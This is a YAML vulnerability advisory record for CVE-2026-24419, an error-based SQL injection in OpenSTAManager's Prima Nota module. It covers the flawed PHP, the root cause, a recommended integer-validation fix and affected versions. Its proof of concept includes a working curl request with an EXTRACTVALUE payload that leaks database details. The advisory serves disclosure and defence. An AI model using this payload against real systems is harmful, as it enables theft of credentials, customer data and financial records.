@@ -1,0 +1,168 @@
+advisory_id: GHSA-4j2x-jh4m-fqv6
+datasource_id: github_osv/GHSA-4j2x-jh4m-fqv6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-4j2x-jh4m-fqv6/GHSA-4j2x-jh4m-fqv6.json
+aliases:
+  - CVE-2026-24419
+summary: "OpenSTAManager has a SQL Injection in the Prima Nota  module\n### Summary\n\nCritical\
+  \ Error-Based SQL Injection vulnerability in the Prima Nota (Journal Entry) module of OpenSTAManager\
+  \ v2.9.8 allows authenticated attackers to extract complete database contents including user\
+  \ credentials, customer PII, and financial records through XML error messages by injecting\
+  \ malicious SQL into URL parameters.\n\n**Status:** ✅ Confirmed and tested on live instance\
+  \ (v2.9.8)\n**Vulnerable Parameters:** `id_documenti` (GET parameters)\n**Affected Endpoint:**\
+  \ `/modules/primanota/add.php`\n**Attack Type:** Error-Based SQL Injection (IN clause)\n\n\
+  ### Details\n\nOpenSTAManager v2.9.8 contains a critical Error-Based SQL Injection vulnerability\
+  \ in the Prima Nota (Journal Entry) module's add.php file. The application fails to validate\
+  \ that comma-separated values from GET parameters are integers before using them in SQL IN()\
+  \ clauses, allowing attackers to inject arbitrary SQL commands and extract sensitive data\
+  \ through XPATH error messages.\n\n**Vulnerability Chain:**\n\n1. **Entry Point:** `/modules/primanota/add.php`\
+  \ (Lines 63-67)\n   ```php\n   $id_documenti = $id_documenti ?: get('id_documenti');\n   $id_documenti\
+  \ = $id_documenti ? explode(',', (string) $id_documenti) : [];\n   ```\n   **Impact:** The\
+  \ `get()` function retrieves user-controlled URL parameters, `explode(',', (string) ...)`\
+  \ splits them by comma, but NO validation ensures elements are integers.\n\n2. **SQL Injection\
+  \ Point:** `/modules/primanota/add.php` (Line 306)\n   ```php\n   $id_anagrafica = $dbo->fetchOne('SELECT\
+  \ idanagrafica FROM co_documenti WHERE id IN('.($id_documenti ? implode(',', $id_documenti)\
+  \ : 0).')')['idanagrafica'];\n   ```\n   **Impact:** Array elements from `$id_documenti` are\
+  \ directly concatenated using `implode()` without type validation or `prepare()`, enabling\
+  \ full SQL injection. \n\n\n**Root Cause Analysis:**\n\nThe vulnerability exists because:\n\
+  1. `get('id_documenti')`  return user-controlled strings\n2. `explode(',', (string) $value)`\
+  \ splits by comma but doesn't validate types\n3. `implode(',', $array)` concatenates array\
+  \ elements directly into SQL\n4. No validation ensures array elements are integers\n5. Attacker\
+  \ can inject SQL by providing: `?id_documenti=1) AND EXTRACTVALUE(...) %23`\n\n**Affected\
+  \ Code Path:**\n```\nGET /modules/primanota/add.php?id_documenti=MALICIOUS_PAYLOAD\n  ↓\n\
+  add.php:63 - $id_documenti = get('id_documenti')\n  ↓\nadd.php:64 - $id_documenti = explode(',',\
+  \ (string) $id_documenti) [NO TYPE VALIDATION]\n  ↓\nadd.php:306 - WHERE id IN('.implode(',',\
+  \ $id_documenti).') [INJECTION POINT]\n```\n\n### PoC\n\n\n**Step 1: Login**\n```bash\ncurl\
+  \ -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \\\n  -d 'username=admin&password=admin'\n\
+  ```\n\n**Step 2: Verify Vulnerability (Error-Based SQL Injection)**\n\n**Test 1: Extract Database\
+  \ User and Version**\n```bash\ncurl -b /tmp/cookies.txt \"http://localhost:8081/modules/primanota/add.php?id_documenti=1)%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20CONCAT(USER(),'%20|%20',VERSION()))))%23\"\
+  \n```\n\n**Response (error message visible to attacker):**\n```html\n<code>SQLSTATE[HY000]:\
+  \ General error: 1105 XPATH syntax error: &#039;~osm@172.18.0.3 | 8.3.0&#039;</code>\n```\n\
+  <img width=\"1231\" height=\"405\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1657b844-281a-431b-8472-c81e4d90bf64\"\
+  \ />\n\n\n### Impact\n\nAll authenticated users with access to the Prima Nota (Journal Entry)\
+  \ module.\n\n\n### Recommended Fix\n\n**Primary Fix - Type Validation:**\n\nFile: `/modules/primanota/add.php`\n\
+  \n**BEFORE (Vulnerable - Lines 63-67):**\n```php\n$id_documenti = $id_documenti ?: get('id_documenti');\n\
+  $id_documenti = $id_documenti ? explode(',', (string) $id_documenti) : [];\n```\n\n**AFTER\
+  \ (Fixed):**\n```php\n$id_documenti = $id_documenti ?: get('id_documenti');\n$id_documenti\
+  \ = $id_documenti ? explode(',', (string) $id_documenti) : [];\n// Validate that all array\
+  \ elements are integers\n$id_documenti = array_map('intval', $id_documenti);\n$id_documenti\
+  \ = array_filter($id_documenti, fn($id) => $id > 0); // Remove zero/negative IDs\n```\n\n\
+  ### Credits\nDiscovered by Łukasz Rybak"
+impacted_packages:
+  - purl: pkg:composer/devcode-it/openstamanager
+    affected_versions: vers:composer/<=2.9.8
+    fixed_versions:
+    affected_packages:
+      - pkg:composer/devcode-it/openstamanager@2.3.0
+      - pkg:composer/devcode-it/openstamanager@2.4.0
+      - pkg:composer/devcode-it/openstamanager@2.4.1
+      - pkg:composer/devcode-it/openstamanager@2.4.2
+      - pkg:composer/devcode-it/openstamanager@2.4.3
+      - pkg:composer/devcode-it/openstamanager@2.4.4
+      - pkg:composer/devcode-it/openstamanager@2.4.5
+      - pkg:composer/devcode-it/openstamanager@2.4.6
+      - pkg:composer/devcode-it/openstamanager@2.4.7
+      - pkg:composer/devcode-it/openstamanager@2.4.8
+      - pkg:composer/devcode-it/openstamanager@2.4.9
+      - pkg:composer/devcode-it/openstamanager@2.4.10
+      - pkg:composer/devcode-it/openstamanager@2.4.11
+      - pkg:composer/devcode-it/openstamanager@2.4.12
+      - pkg:composer/devcode-it/openstamanager@2.4.13
+      - pkg:composer/devcode-it/openstamanager@2.4.14
+      - pkg:composer/devcode-it/openstamanager@2.4.15
+      - pkg:composer/devcode-it/openstamanager@2.4.16
+      - pkg:composer/devcode-it/openstamanager@2.4.17
+      - pkg:composer/devcode-it/openstamanager@2.4.17%2B1
+      - pkg:composer/devcode-it/openstamanager@2.4.18
+      - pkg:composer/devcode-it/openstamanager@2.4.19
+      - pkg:composer/devcode-it/openstamanager@2.4.20
+      - pkg:composer/devcode-it/openstamanager@2.4.21
+      - pkg:composer/devcode-it/openstamanager@2.4.22
+      - pkg:composer/devcode-it/openstamanager@2.4.23
+      - pkg:composer/devcode-it/openstamanager@2.4.24
+      - pkg:composer/devcode-it/openstamanager@2.4.25
+      - pkg:composer/devcode-it/openstamanager@2.4.26
+      - pkg:composer/devcode-it/openstamanager@2.4.27
+      - pkg:composer/devcode-it/openstamanager@2.4.28
+      - pkg:composer/devcode-it/openstamanager@2.4.29
+      - pkg:composer/devcode-it/openstamanager@2.4.30
+      - pkg:composer/devcode-it/openstamanager@2.4.31
+      - pkg:composer/devcode-it/openstamanager@2.4.32
+      - pkg:composer/devcode-it/openstamanager@2.4.33
+      - pkg:composer/devcode-it/openstamanager@2.4.34
+      - pkg:composer/devcode-it/openstamanager@2.4.35
+      - pkg:composer/devcode-it/openstamanager@2.4.36
+      - pkg:composer/devcode-it/openstamanager@2.4.37
+      - pkg:composer/devcode-it/openstamanager@2.4.38
+      - pkg:composer/devcode-it/openstamanager@2.4.39
+      - pkg:composer/devcode-it/openstamanager@2.4.40
+      - pkg:composer/devcode-it/openstamanager@2.4.41
+      - pkg:composer/devcode-it/openstamanager@2.4.42
+      - pkg:composer/devcode-it/openstamanager@2.4.43
+      - pkg:composer/devcode-it/openstamanager@2.4.44
+      - pkg:composer/devcode-it/openstamanager@2.4.45
+      - pkg:composer/devcode-it/openstamanager@2.4.46
+      - pkg:composer/devcode-it/openstamanager@2.4.47
+      - pkg:composer/devcode-it/openstamanager@2.4.48
+      - pkg:composer/devcode-it/openstamanager@2.4.49
+      - pkg:composer/devcode-it/openstamanager@2.4.50
+      - pkg:composer/devcode-it/openstamanager@2.4.51
+      - pkg:composer/devcode-it/openstamanager@2.4.52
+      - pkg:composer/devcode-it/openstamanager@2.4.53
+      - pkg:composer/devcode-it/openstamanager@2.4.54
+      - pkg:composer/devcode-it/openstamanager@2.5.0
+      - pkg:composer/devcode-it/openstamanager@2.5.1-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.2-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.3
+      - pkg:composer/devcode-it/openstamanager@2.5.4
+      - pkg:composer/devcode-it/openstamanager@2.5.5
+      - pkg:composer/devcode-it/openstamanager@2.5.6
+      - pkg:composer/devcode-it/openstamanager@2.5.7
+      - pkg:composer/devcode-it/openstamanager@2.6.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.6.1
+      - pkg:composer/devcode-it/openstamanager@2.6.2
+      - pkg:composer/devcode-it/openstamanager@2.7.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.7.0
+      - pkg:composer/devcode-it/openstamanager@2.7.1
+      - pkg:composer/devcode-it/openstamanager@2.7.2
+      - pkg:composer/devcode-it/openstamanager@2.7.3
+      - pkg:composer/devcode-it/openstamanager@2.8.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.8.1
+      - pkg:composer/devcode-it/openstamanager@2.8.2
+      - pkg:composer/devcode-it/openstamanager@2.8.3
+      - pkg:composer/devcode-it/openstamanager@2.9.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.9.0
+      - pkg:composer/devcode-it/openstamanager@2.9.1
+      - pkg:composer/devcode-it/openstamanager@2.9.2
+      - pkg:composer/devcode-it/openstamanager@2.9.3
+      - pkg:composer/devcode-it/openstamanager@2.9.4
+      - pkg:composer/devcode-it/openstamanager@2.9.5
+      - pkg:composer/devcode-it/openstamanager@2.9.6
+      - pkg:composer/devcode-it/openstamanager@2.9.7
+      - pkg:composer/devcode-it/openstamanager@2.9.8
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-4j2x-jh4m-fqv6/GHSA-4j2x-jh4m-fqv6.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/devcode-it/openstamanager
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24419
+    reference_type:
+    reference_id: CVE-2026-24419
+  - url: https://github.com/devcode-it/openstamanager/security/advisories/GHSA-4j2x-jh4m-fqv6
+    reference_type:
+    reference_id: GHSA-4j2x-jh4m-fqv6
+exploits: []
